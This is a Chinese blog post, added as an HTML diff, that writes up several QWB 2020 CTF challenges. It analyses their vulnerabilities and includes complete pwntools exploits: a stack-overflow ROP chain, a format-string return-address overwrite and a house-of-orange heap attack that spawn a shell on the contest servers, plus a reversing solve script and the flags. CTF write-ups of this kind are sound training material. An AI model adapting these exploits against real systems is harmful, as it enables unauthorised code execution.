@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="description" content>
+  <meta name="author" content="chumen77">
+  <meta name="keywords" content>
+  <title>强网杯2020部分题目 ~ Chumen77&#39;s Blog</title>
+
+  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
+<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
+<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">
+
+
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Chumen77's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" false
+         style="background: url('/img/default.png')no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <br>
+              
+                <p class="mt-3">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
+                  星期一, 八月 24日 2020, 10:34 上午
+                </p>
+              
+
+              <p>
+                
+                  
+                  &nbsp;<i class="far fa-chart-bar"></i>
+                  <span class="post-count">
+                    2.6k 字
+                  </span>&nbsp;
+                
+
+                
+                  
+                  &nbsp;<i class="far fa-clock"></i>
+                  <span class="post-count">
+                      13 分钟
+                  </span>&nbsp;
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
+                  <span id="busuanzi_container_page_pv">
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>&nbsp;
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto" id="post">
+          <div class="markdown-body">
+            <h1 id="强网杯2020-部分题目"><a href="#强网杯2020-部分题目" class="headerlink" title="强网杯2020 部分题目"></a>强网杯2020 部分题目</h1><h2 id="babymessage"><a href="#babymessage" class="headerlink" title="babymessage"></a>babymessage</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><pre><code>   Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x3fe000)</code></pre><p>基本保护不算多。</p>
+<p>是一个伪堆题。</p>
+<h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>在 <code>leave_message(v1)</code>函数这里的v1上来取值就是16</p>
+<pre><code class="c">__int64 __fastcall leave_message(unsigned int a1)
+{
+  int v1; // ST14_4
+  __int64 v3; // [rsp+18h] [rbp-8h]
+
+  puts(&quot;message: &quot;);
+  v1 = read(0, &amp;v3, a1);
+  strncpy(buf, (const char *)&amp;v3, v1);
+  buf[v1] = 0;
+  puts(&quot;done!\n&quot;);
+  return 0LL;
+}</code></pre>
+<p>进入以后可以发现，v3是只有8字节大小的，可以溢出8字节，可以覆盖到rbp。</p>
+<h5 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h5><pre><code>.text:0000000000400985 ; 22:         if ( v1 &gt; 256 )
+.text:0000000000400985                 cmp     [rbp+var_4], 100h
+.text:000000000040098C                 jle     short loc_400995
+.text:000000000040098E ; 23:           v1 = 256;
+.text:000000000040098E                 mov     [rbp+var_4], 100h
+.text:0000000000400995 ; 24:         leave_message(v1);</code></pre><p>在进入<code>leave_message(v1)</code>前v1有一个对于0x100大小的判断，要是v1大于0x100就给设置为0x100。这就可以实现栈溢出，进行rop。</p>
+<p>怎么控制v1：</p>
+<pre><code>signed int v1; // [rsp+Ch] [rbp-4h]</code></pre><p>可以明显看到v1在rbp-4的地址，然后rbp，也可以进行溢出覆盖，覆盖到合适的地方后，保障-4后，有个int大小的大于等于0x100的值即可。</p>
+<p>这个合适地址，可以从<code>leave_name()</code> 下手，因为其往bss段读了值。</p>
+<pre><code>byte_6010D0[(signed int)read(0, byte_6010D0, 4uLL)] = 0;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/8uyl03.png" srcset="/img/loading.gif" alt></p>
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><ul>
+<li>构造rop链，泄漏出libc的地址，返回start，让程序重新跑起来，清理栈</li>
+<li>再次利用，控制ret address 为<code>one_gadget</code></li>
+</ul>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./babymessage&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;123.56.170.202&#39;,21342)
+    libc = elf.libc
+    libc = ELF(&#39;./libc-2.27.so&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+rce18 = [0x4f2c5,0x4f322,0x10a38c]
+arae18 = 0x3ebca0
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+pop_rdi = 0x0000000000400ac3
+start = 0x04006E0
+sla(&#39;choice&#39;,&#39;1&#39;)
+sa(&#39;name&#39;,p32(0xffff))
+sla(&#39;choice&#39;,&#39;2&#39;)
+payload = p64(0x02000200) + p64(0x06010D0+4)
+
+sa(&#39;mes&#39;,payload)
+sla(&#39;choice&#39;,&#39;2&#39;)
+rop = flat([pop_rdi,elf.got[&#39;__libc_start_main&#39;],elf.plt[&#39;puts&#39;],start])
+payload = p64(0x02000200) + p64(0x06010D0+4)
+payload +=rop
+sa(&#39;mes&#39;,payload)
+ru(&#39;done!&#39;)
+r(2)
+libc_base = uu64(r(6)) - libc.sym[&#39;__libc_start_main&#39;]
+info_addr(&#39;libc_base&#39;,libc_base)
+
+sla(&#39;choice&#39;,&#39;1&#39;)
+sa(&#39;name&#39;,p32(0xffff))
+sla(&#39;choice&#39;,&#39;2&#39;)
+# debug()
+payload = p64(0x02000200) + p64(0x06010D0+4)
+sa(&#39;mes&#39;,payload)
+rec = 0x10a45c + libc_base
+sla(&#39;choice&#39;,&#39;2&#39;)
+rop = p64(rec)
+payload = p64(0x02000200) + p64(0x06010D0+4)
+payload +=rop
+sa(&#39;mes&#39;,payload)
+itr()</code></pre>
+<pre><code class="python">flag{f4c1c2c2407055f2665dec486e7d1b16}</code></pre>
+<h2 id="Siri"><a href="#Siri" class="headerlink" title="Siri"></a>Siri</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>保护全开。栈上的格式化字符串漏洞，并且可以无限次触发。</p>
+<h4 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h4><pre><code class="c">signed __int64 __fastcall sub_1212(const char *a1)
+{
+  char *v2; // [rsp+18h] [rbp-128h]
+  char s; // [rsp+20h] [rbp-120h]
+  unsigned __int64 v4; // [rsp+138h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  v2 = strstr(a1, &quot;Remind me to &quot;);
+  if ( !v2 )
+    return 0LL;
+  memset(&amp;s, 0, 0x110uLL);
+  sprintf(&amp;s, &quot;&gt;&gt;&gt; OK, I&#39;ll remind you to %s&quot;, v2 + 13);
+  printf(&amp;s);
+  puts(&amp;::s);
+  return 1LL;
+}
+</code></pre>
+<p>发现存在格式化字符串，但是你所输入的都会被sprintf处理以后给printf函数。由于其是<code>%s</code>来处理数据，这就让直接在栈上写地址，然后攻击造成了难度。<br>但是调试可以发现，其实输入的东西还会保留在栈上，因为sprintf处理数据也是从栈上拿的，所以会被保留的。</p>
+<h4 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h4><ul>
+<li>第一次触发，泄漏出libc地址，stack地址。</li>
+<li>执行到printf准备触发格式化字符串漏洞时，用sprintf残留栈上的数据（在0x100后），这个需要精心构造好后，进行攻击ret address。需要一次性改好。</li>
+</ul>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./pwn&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;123.56.170.202&#39;,12124)
+    # libc = elf.libc
+    libc = ELF(&#39;./libc.so.6&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
+rce18 = [0x4f2c5,0x4f322,0x10a38c]
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    gdb.attach(io)
+    pause()
+
+def start_attc():
+    sla(&#39;&gt;&gt;&#39;,&#39;Hey Siri!&#39;)
+    r()
+
+a = &#39;Remind me to &#39;
+start_attc()
+payload = str(a) + &#39;%83$p&#39; + &#39;bbb&#39; + &#39;%7$p&#39;
+# ru(&#39;&gt;&gt;&gt;&#39;)
+s(payload)
+ru(&#39;0x&#39;)
+libc_base = int(r(12),16) - 0x21b97
+info_addr(&#39;libc_base&#39;,libc_base)
+ru(&#39;bbb0x&#39;)
+stack_base = int(r(12),16) - 0x150
+info_addr(&#39;stack_base&#39;,stack_base)
+tag = stack_base + 0x148
+
+start_attc()
+def fmt_short(prev,val,idx,byte = 2):
+    result = &quot;&quot;
+    if prev &lt; val :
+        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;
+    elif prev == val :
+        result += &#39;&#39;
+    else :
+        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;
+    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;
+    return result
+prev = 27
+fmtpayload = &quot;&quot;
+key = 0x4f365 + libc_base
+info_addr(&#39;key&#39;,key)
+for i in range(3):
+    fmtpayload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,55+i) 
+    prev = (key &gt;&gt; i*16) &amp; 0xffff
+print(fmtpayload)
+payload = str(a) + fmtpayload
+payload +=&#39;aaa&#39; + &#39;b&#39; + p64(tag)[0:6] + &#39;\x00&#39;*2 + p64(tag+2)[0:6] + &#39;\x00&#39;*2  + p64(tag+4)[0:6] + &#39;\x00&#39;*2 + p64(tag+6)[0:6] + &#39;\x00&#39;*2
+s(payload)
+
+itr()</code></pre>
+<pre><code class="python">flag{da8836b9e9df3db44fe4bd7f39d4f7ab}</code></pre>
+<h2 id="water-re"><a href="#water-re" class="headerlink" title="water_re"></a><code>water_re</code></h2><p>Ida反编译后的代码比较难看，发现重点数据造成了困难，就采取动态调试。</p>
+<p>基本流程就是，gets一段你输入的flag，读入后用<code>sub_12f0_</code>进行处理，然后给<code>v10</code> <code>v11</code> <code>v12</code>  <code>v13</code> 判断是否相等。其实也就是一个个字符来进行对比。</p>
+<h3 id="sub-12F0-加密函数"><a href="#sub-12F0-加密函数" class="headerlink" title="sub_12F0_加密函数"></a><code>sub_12F0_</code>加密函数</h3><pre><code class="python">_BYTE *__fastcall sub_12F0(_BYTE *a1)
+{
+  _BYTE *result; // rax
+  int v2; // esi
+  __int64 v3; // r8
+  __int64 v4; // rdx
+  __int64 v5; // rax
+  int v6; // ecx
+  char v7; // r8
+  char v8; // dl
+
+  __asm { endbr64 }
+  result = (_BYTE *)sub_1090();
+  if ( (signed int)result &lt;= 0 )
+    return result;
+  v2 = (signed int)result;
+  v3 = (unsigned int)((_DWORD)result - 1);
+  v4 = 0LL;
+  do
+  {
+    a1[v4] = (a1[v4] ^ byte_4010[(unsigned int)v4 % 7]) + 65;
+    v5 = v4++;
+  }
+  while ( v3 != v5 );
+  v6 = 0;
+  do
+  {
+    v7 = a1[3];
+    result = a1 + 3;
+    do
+    {
+      v8 = *(result-- - 1);
+      result[1] = v8;
+    }
+    while ( a1 != result );
+    v6 += 4;
+    *a1 = v7;
+    a1 += 4;
+  }
+  while ( v2 &gt; v6 );
+  return result;
+}</code></pre>
+<p>动态调试，进行起来很容易看懂。上来就是一个对输入的东西进行一个与<code>byte_4010</code>的字符<code>&#39;Q&#39;, &#39;W&#39;, &#39;B&#39;, &#39;l&#39;, &#39;o&#39;, &#39;g&#39;, &#39;s&#39;</code> 7组来进行一个异或和+65。</p>
+<p>然后下面：</p>
+<pre><code class="python"> while ( v3 != v5 );
+  v6 = 0;
+  do
+  {
+    v7 = a1[3];
+    result = a1 + 3;
+    do
+    {
+      v8 = *(result-- - 1);
+      result[1] = v8;
+    }
+    while ( a1 != result );
+    v6 += 4;
+    *a1 = v7;
+    a1 += 4;
+  }
+</code></pre>
+<p>只看着让人头大，输入<code>flag{11111111111111111111111111111111111111111}</code> 动态调试一下发现：</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/oqoJ2Y.png" srcset="/img/loading.gif" alt></p>
+<p>分析这2组数据就会发现，每次对4个数据为一组进行处理。处理后结果就是原来的： <code>v1 &gt; v2 &gt; v3 &gt; v4</code> 变为 <code>v4 &gt; v1 &gt; v2 &gt; v3</code> 这样的结果。</p>
+<p>然后处理完就给<code>v10</code> <code>v11</code> <code>v12</code>  <code>v13</code> 判断是否相等。这肯定为一串处理过的字符串，ida中也可以找到，直接提取有点害怕提取错，动调时提取一下出来：</p>
+<pre><code class="python">tag1=[0x4C, 0x78, 0x7C, 0x64, 0x54, 0x55, 0x77, 0x65, 0x5C, 0x49,
+0x76, 0x4E, 0x68, 0x43, 0x42, 0x4F, 0x4C, 0x71, 0x44, 0x4E,
+0x66, 0x57, 0x7D, 0x49, 0x6D, 0x46, 0x5A, 0x43, 0x74, 0x69,
+0x79, 0x78, 0x4F, 0x5C, 0x50, 0x57, 0x5E, 0x65, 0x62, 0x44]</code></pre>
+<p>也就是这一段数据。</p>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>自己直接手动替换的数据。</p>
+<pre><code class="python">tag1=[0x4C, 0x78, 0x7C, 0x64, 0x54, 0x55, 0x77, 0x65, 0x5C, 0x49,
+0x76, 0x4E, 0x68, 0x43, 0x42, 0x4F, 0x4C, 0x71, 0x44, 0x4E,
+0x66, 0x57, 0x7D, 0x49, 0x6D, 0x46, 0x5A, 0x43, 0x74, 0x69,
+0x79, 0x78, 0x4F, 0x5C, 0x50, 0x57, 0x5E, 0x65, 0x62, 0x44]
+
+tag2 = [0x78, 0x7C, 0x64,0x4C,
+0x55, 0x77, 0x65,0x54, 
+0x49,0x76, 0x4E,0x5C, 
+0x43, 0x42, 0x4F,0x68,
+0x71, 0x44, 0x4E,0x4C,
+0x57, 0x7D, 0x49,0x66, 
+0x46, 0x5A, 0x43,0x6D, 
+0x69,0x79, 0x78, 0x74, 
+0x5C, 0x50, 0x57, 0x4F,
+0x65, 0x62, 0x44,0x5E]
+
+qwkey = [&#39;Q&#39;, &#39;W&#39;, &#39;B&#39;, &#39;l&#39;, &#39;o&#39;, &#39;g&#39;, &#39;s&#39;]
+flag = &#39;&#39;
+i = 0
+j = 0
+for i in range(len(tag2)):
+    if j ==7:
+        j = 0
+    flag += chr((tag2[i] - 65) ^ ord(qwkey[j % 7]))
+    j += 1
+print(str(flag))
+</code></pre>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/7JWt2B.png" srcset="/img/loading.gif" alt><br>估计没有提取全，但是也很容易知道flag了。</p>
+<pre><code class="python">flag{QWB_water_problem_give_you_the_score}</code></pre>
+<h2 id="Just-a-Galgame"><a href="#Just-a-Galgame" class="headerlink" title="Just_a_Galgame"></a><code>Just_a_Galgame</code></h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>题目提醒了是house of orange，那就想着这样利用即可。现在house of orange的思想，统指主要是针对没有free的堆题，其改top chunk，然后申请一个大点的chunk，来进行获取一个进入unsortbin 的堆块。没有如最早的很经典的利用unsortbin attack 和 io 结合来获取shell。</p>
+<p>题目的case2 <code>Invite her to go to a movie.</code> 中：</p>
+<pre><code class="c">  printf(&quot;movie name &gt;&gt; &quot;, &amp;buf);
+            v4 = atoi((const char *)&amp;buf);
+            read(0, (void *)(qword_404060[v4] + 0x60), 0x10uLL);</code></pre>
+<p>由于其是在加0x60之后读取，且在case 1 只是malloc(0x68)，所以在此处可以溢出8个字节，改写到 top chunk。</p>
+<p>并且case3：</p>
+<pre><code class="c">  puts(&quot;You are the apple of my eyes too!&quot;);
+          qword_404098 = (__int64)malloc(0x1000uLL);
+          ++v12;</code></pre>
+<p>可以给你申请0x1000的堆块，这就可以实现了house of orange。</p>
+<p>在case5中：</p>
+<pre><code class="c">  puts(&quot;\nHotaru: Won&#39;t you stay with me for a while? QAQ\n&quot;);
+        read(0, &amp;key, 8uLL);    </code></pre>
+<p>会给<code>0x4040A0</code> 读一段数据。</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/RNbigg.png" srcset="/img/loading.gif" alt><br>是紧挨着堆块的。然而在case2中在edit时也没有对堆块序号的检查,让个人输入个8 即可取到这里，进行编辑。</p>
+<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
+<li>house of orange来获取一个unsortbin </li>
+<li>申请一个堆块，会在这个old top chunk中，切出一个堆块，其上会存在libc的相关地址</li>
+<li>show一下，泄漏出libc base</li>
+<li>leave <code>__malloc_hook - 0x60</code>的地址在<code>key</code> 处，然后进行编辑这里的数据。</li>
+</ul>
+<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./Just_a_Galgame&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 1
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,27411)
+    libc = elf.libc
+    #libc = ELF(&#39;.&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
+rce18 = [0x4f2c5,0x4f322,0x10a38c]
+realloc = [0x2,0x4,0x6,0xB,0xC,0xD]
+arae18 = 0x3ebca0
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+def edit(idx,data):
+    sla(&quot;&gt;&gt;&quot;,&#39;2&#39;)
+    sla(&#39;idx&#39;,str(idx))
+    sa(&#39;name&#39;,str(data))
+
+def show():
+    sla(&#39;&gt;&gt;&#39;,&#39;4&#39;)
+
+def add():
+    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)
+
+def add100():
+    sla(&#39;&gt;&gt;&#39;,&#39;3&#39;)
+
+def leave(buf):
+    sla(&#39;&gt;&gt;&#39;,&#39;5&#39;)
+    s(str(buf))
+
+add()
+payload = &#39;\x00&#39;*8 + p64(0xd41)
+edit(0,payload)
+add100()
+add()
+show()
+ru(&#39;1: &#39;)
+libc_base = uu64(r(6)) - 0x3ec2a0
+info_addr(&#39;libc&#39;,libc_base)
+leave(p64(libc_base + 0x3ebc30 - 0x60))
+one_rec = 0x4f3c2 + libc_base
+edit(8,p64(one_rec))
+add()
+itr()</code></pre>
+<p>还是挺简单的，比赛时竟然没有看这个题。</p>
+
+            <hr>
+          </div>
+          <br>
+          <div>
+            <p>
+            
+            
+              <span>
+                <i class="iconfont icon-tag"></i>
+                
+                  <a class="hover-with-bg" href="/tags/pwn">pwn</a>
+                
+                  <a class="hover-with-bg" href="/tags/re">re</a>
+                
+              </span>
+            
+            </p>
+            
+              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+  </div>
+</div>
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    <br>
+
+    
+  
+    <!-- 不蒜子统计PV -->
+    
+    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
+          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
+  
+  
+    <!-- 不蒜子统计UV -->
+    
+    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
+            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
+  
+  <br>
+
+
+
+    
+
+
+    <!-- cnzz Analytics icon -->
+    
+
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="/lib/jquery/jquery.min.js" ></script>
+<script src="/lib/popper/popper.min.js" ></script>
+<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
+<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
+<script src="/js/main.js" ></script>
+
+
+  <script src="/js/lazyload.js" ></script>
+
+
+
+  
+    <script src="/lib/tocbot/tocbot.min.js" ></script>
+  
+  <script src="/js/post.js" ></script>
+
+
+
+  <script src="/lib/smoothscroll/SmoothScroll.min.js" ></script>
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+<!-- Plugins -->
+
+
+  
+
+  
+
+  
+
+  
+
+  <!-- cnzz Analytics -->
+  
+
+
+
+  <script src="/lib/prettify/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="/lib/typed/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "强网杯2020部分题目&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="/lib/anchor/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "false",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+  
+  
+    <script type="text/javascript">
+      //定义获取词语下标
+      var a_idx = 0;
+      jQuery(document).ready(function ($) {
+        //点击body时触发事件
+        $("body").click(function (e) {
+          //需要显示的词语
+          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
+          //设置词语给span标签
+          var $i = $("<span/>").text(a[a_idx]);
+          //下标等于原来下标+1  余 词语总数
+          a_idx = (a_idx + 1) % a.length;
+          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
+          //获取x和y的指针坐标
+          var x = e.pageX, y = e.pageY;
+          //在鼠标的指针的位置给$i定义的span标签添加css样式
+          $i.css({
+            "z-index": 999,
+            "top": y - 20,
+            "left": x,
+            "position": "absolute",
+            "font-weight": "bold",
+            "color": rand_color()
+          });
+          // 随机颜色
+          function rand_color() {
+            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+          }
+          //在body添加这个标签
+          $("body").append($i);
+          //animate() 方法执行 CSS 属性集的自定义动画。
+          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
+          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
+          $i.animate({
+            //将原来的位置向上移动180
+            "top": y - 180,
